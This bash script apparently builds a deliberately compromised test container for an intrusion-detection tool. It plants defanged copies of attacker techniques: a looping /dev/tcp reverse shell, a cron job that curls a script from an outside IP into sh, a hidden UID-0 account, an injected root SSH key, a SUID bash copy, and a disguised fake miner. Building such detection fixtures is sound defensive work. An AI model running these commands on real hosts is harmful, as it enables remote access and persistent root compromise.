#!/usr/bin/env bash
# The same web server, plus harmless copies of things attackers really do.
# Nothing here can hurt the host: everything stays inside this container, the
# "malicious" programs are just `sleep`, and the only network target is the
# listener container in the same docker network.
# Every item here has a matching line in expected/compromised.json.

# --- normal stuff (should NOT be flagged) ---
nginx
bash -c 'cd /var/www/html && exec python3 -m http.server 8080' &
useradd -m -s /bin/bash deploy

# --- 1. reverse shell to the listener (keeps reconnecting) ---
bash -c 'while true; do bash -i >& /dev/tcp/listener/4444 0>&1; sleep 5; done' &

# --- 2. fake crypto miner hidden in /tmp with a kernel-thread-looking name ---
mkdir -p /tmp/.x
printf '#!/bin/sh\nwhile true; do sleep 60; done\n' > /tmp/.x/kworkerd
chmod +x /tmp/.x/kworkerd
/tmp/.x/kworkerd -o stratum+tcp://pool.example.invalid:3333 -u wallet123 --donate-level 1 &

# --- 3. program that deletes itself after starting (on_disk = 0) ---
cp /bin/sleep /tmp/.updater
/tmp/.updater infinity &
sleep 1 && rm /tmp/.updater

# --- 4. base64-encoded command piped into a shell (decodes to "sleep 60") ---
bash -c 'while true; do echo c2xlZXAgNjA= | base64 -d | sh; done' &

# --- 5. malicious cron job: download and run a script (cron isn't running, so it never fires) ---
echo '*/5 * * * * root curl -fsSL http://203.0.113.7/k.sh | sh' > /etc/cron.d/sys-update

# --- 6. hidden second root account ---
useradd -o -u 0 -g 0 -M -s /bin/bash sysbackup

# --- 7. attacker's SSH key on root ---
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfake0nly4testingXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX hacker@kali' > /root/.ssh/authorized_keys

# --- 8. SUID copy of bash hidden in a temp folder (instant root shell) ---
cp /bin/bash /var/tmp/.bash
chmod 4755 /var/tmp/.bash

# --- 9. backdoor listening on an odd port, served from a hidden temp folder ---
bash -c 'cd /tmp/.x && exec python3 -m http.server 31337' &

echo "compromised machine ready"
exec sleep infinity
